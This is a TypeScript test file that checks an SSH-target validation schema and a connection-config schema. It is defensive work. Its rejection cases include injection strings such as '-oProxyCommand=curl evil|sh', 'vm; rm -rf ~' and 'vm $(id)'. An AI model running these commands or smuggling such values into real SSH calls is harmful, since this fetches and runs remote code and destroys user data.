import { describe, expect, test } from "bun:test";
import { connectionConfigSchema, sshTargetSchema } from "./connection";

describe("sshTargetSchema", () => {
  test.each([
    "vm",
    "scout-vm.tailnet.ts.net",
    "michael@20.51.3.9",
    "az_user@host-1",
    " vm ",
  ])("accepts %p", (target) => {
    expect(sshTargetSchema.parse(target)).toBe(target.trim());
  });

  // Each of these would change what `ssh` does rather than where it connects.
  test.each([
    "-oProxyCommand=curl evil|sh",
    "user@-oProxyCommand=x",
    "-J attacker@jump vm",
    "vm; rm -rf ~",
    "vm $(id)",
    "user@host:2222",
    "",
  ])("rejects %p", (target) => {
    expect(sshTargetSchema.safeParse(target).success).toBe(false);
  });
});

describe("connectionConfigSchema", () => {
  test("remote requires a valid target", () => {
    expect(connectionConfigSchema.safeParse({ mode: "remote" }).success).toBe(false);
    expect(connectionConfigSchema.safeParse({ mode: "remote", sshTarget: "-x" }).success).toBe(
      false,
    );
    expect(connectionConfigSchema.parse({ mode: "remote", sshTarget: "me@vm" })).toEqual({
      mode: "remote",
      sshTarget: "me@vm",
    });
  });

  test("local carries nothing else", () => {
    expect(connectionConfigSchema.parse({ mode: "local", sshTarget: "vm" })).toEqual({
      mode: "local",
    });
  });
});
